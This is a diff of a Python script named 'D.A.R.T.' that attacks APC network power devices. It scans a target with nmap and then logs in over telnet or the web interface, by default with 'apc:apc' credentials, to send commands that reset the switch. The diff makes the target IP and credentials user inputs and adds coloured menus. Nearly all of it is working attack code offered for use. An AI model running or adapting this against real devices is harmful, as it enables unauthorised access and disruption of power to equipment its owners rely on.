@@ -2,10 +2,7 @@
 #Written by Paul Oates
 
 #TODO
-#Get user input for username:password + ip for telnet+http attack
-#Get user input for recon + scan entire network for APC devices.
-#Delete banner
-#Better UI?
+#Scan entire network for APC devices.
 
 import requests
 from pyfiglet import Figlet
@@ -13,30 +10,36 @@ import time
 import nmap
 import socket
 import re
+import os
+import random
+
+def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
+def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
+def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
+def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
+
 
 #url="http://192.168.1.20"
-nm = nmap.PortScanner()
-IP = '192.168.1.20'
 
-def recon():
 
-    print('[*] Running active scan...')
-    host = nm.scan(IP, arguments='-O -sV')
+def recon(ip):
+    nm = nmap.PortScanner()
+    prGreen('[*] Running active scan...')
+    host = nm.scan(ip, arguments='-O -sV')
     
     print('\n')
-    print("[+] OS: "+host['scan'][IP]['osmatch'][0]['name'])
-    print('===========================')
+    prGreen("[+] OS: "+host['scan'][IP]['osmatch'][0]['name'])
+    prGreen('===========================')
     #print(host['scan'][IP]['tcp'])
     for port in host['scan'][IP]['tcp']:
-        print('[+] Port Number: ' +str(port))
-        print('[+] State: '+host['scan'][IP]['tcp'][port]['state'])
-        print('[+] Service: '+host['scan'][IP]['tcp'][port]['name'])
-        print('[+] Product: '+host['scan'][IP]['tcp'][port]['product'])
+        prGreen('[+] Port Number: ' +str(port))
+        prGreen('[+] State: '+host['scan'][IP]['tcp'][port]['state'])
+        prGreen('[+] Service: '+host['scan'][IP]['tcp'][port]['name'])
+        prGreen('[+] Product: '+host['scan'][IP]['tcp'][port]['product'])
         print('\n')
 
-def exploit_telnet(u,p):
-    username=u
-    password=p
+def exploit_telnet(ip, username,password):
+    IP = ip
     PORT = 23
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         print('[*] Creating socket connection to: '+IP+":"+str(PORT))
@@ -44,14 +47,14 @@ def exploit_telnet(u,p):
         s.connect((IP,PORT))
 
         
-        print('[+] Getting data from server...')
+        prGreen('[+] Getting data from server...')
 
         res = s.recv(2048)
         res = res + s.recv(2048)
         #time.sleep(1)
         #print(res)
         if res==b'\xff\xfb\x01\n\rUser Name : ':
-            print('[+] Sending username to socket...')
+            prGreen('[+] Sending username to socket...')
             time.sleep(1)
 
             for c in username:
@@ -60,7 +63,7 @@ def exploit_telnet(u,p):
             s.sendall(b'\r')
             s.recv(100)
 
-            print('[+] Sending password to socket...')
+            prGreen('[+] Sending password to socket...')
             time.sleep(1)
             for c in password:
                 s.sendall(c.encode('UTF-8'))
@@ -75,7 +78,7 @@ def exploit_telnet(u,p):
                 full_res = full_res+res
                 #time.sleep(1)
                 if b'\r\n>' in res:
-                    print('[+] Login successful (apc:apc)!!\n[+] Server sent back menu, sending commands to reset the switch...')
+                    prGreen('[+] Login successful (apc:apc)!!\n[+] Server sent back menu, sending commands to reset the switch...')
                     time.sleep(2)
                     break
 
@@ -119,27 +122,27 @@ def exploit_telnet(u,p):
                 full_res = full_res+res
                 time.sleep(1)
                 if b'Press <ENTER> to continue...' in res:
-                    print('[+] Reset successful... break anything good? :^)')
+                    prGreen('[+] Reset successful... break anything good? :^)')
                     break    
 
         s.close()
 
-def exploit_http():
+def exploit_http(ip, username,password):
     #Logon
     data = {
-    'login_username': 'apc',
-    'login_password': 'apc',
+    'login_username': ''+username+'',
+    'login_password': ''+password+'',
     'submit': 'Log On',
     }
-    response = requests.post('http://192.168.1.20/Forms/login1', data=data)
+    response = requests.post('http://'+ip+'/Forms/login1', data=data)
     pattern = r'\/([a-zA-Z0-9]+)\/home\.htm'
     match = re.search(pattern, response.url)
     print(response.url)
     if match:
         token = match.group(1)
-        print("[+] Logged in and obtained token: "+token)
+        prGreen("[+] Logged in and obtained token: "+token)
     else:
-        print("[-] Logon probably failed - is someone else already logged on?")
+        prRed("[-] Logon probably failed - is someone else already logged on?")
         return
     time.sleep(1)
 
@@ -148,51 +151,55 @@ def exploit_http():
     'controlaction': '1',
     'submit': 'Apply',
     }
-    print('[+] Reseting switch!!')
+    prGreen('[+] Reseting switch!!')
     time.sleep(1)
-    response = requests.post('http://192.168.1.20/NMC/'+token+'/Forms/control1', data=data)
+    response = requests.post('http://'+ip+'/NMC/'+token+'/Forms/control1', data=data)
     time.sleep(1)
     
     #Logout
-    logout_url='http://192.168.1.20/NMC/'+token+'/logout.htm'
+    logout_url='http://'+ip+'/NMC/'+token+'/logout.htm'
     response = requests.get(logout_url)
     if 'You are now logged off.' in response.text:
-        print('[+] Logged out.')
+        prGreen('[+] Logged out.')
 
-def patch():
-    print('TODO')
 
 def print_banner():
-    banner = Figlet(font='alligator',width=1000)
-    print(banner.renderText('D . A . R . T .'))
+    fonts = ['alligator','alligator2','basic','big','block','chunky','colossal','cosmic','epic','isometric1','larry3d']
+    banner = Figlet(font=random.choice(fonts),width=1000)
+    prCyan(banner.renderText('D . A . R . T .'))
 
 def print_menu():
-    #os.system('clear')
+    os.system('clear')
     print_banner()
-    print('1) Recon')
-    print('2) Exploit (telnet)')
-    print('3) Exploit (http)')
-    print('4) Patch')
-    print('0) Exit')
+
+    prGreen('1) Recon')
+    prGreen('2) Exploit (telnet)')
+    prGreen('3) Exploit (http)')
+    prRed('0) Exit')
 
     print('Enter your option: ')
     i = int(input())
 
     if i == 1:
-        recon()
+        ip = str(input("Enter IP of device: "))
+        recon(ip)
+        input("Press any key to return to menu...")
     elif i==2:
-        exploit_telnet('apc','apc')
+        ip = str(input("Enter IP of device: "))
+        username = str(input('Enter username: '))
+        password = str(input('Enter password: '))
+        exploit_telnet(ip,username,password)
     elif i==3:
-        exploit_http()
-    elif i==4:
-        patch()
+        ip = str(input("Enter IP of device: "))
+        username = str(input('Enter username: '))
+        password = str(input('Enter password: '))
+        exploit_http(ip,username,password)
     elif i==0:
         exit()
-    
     else:
         print("Invalid input, try again.")
     
-    #print_menu()
+    print_menu()
 
 def main():
     print_menu()
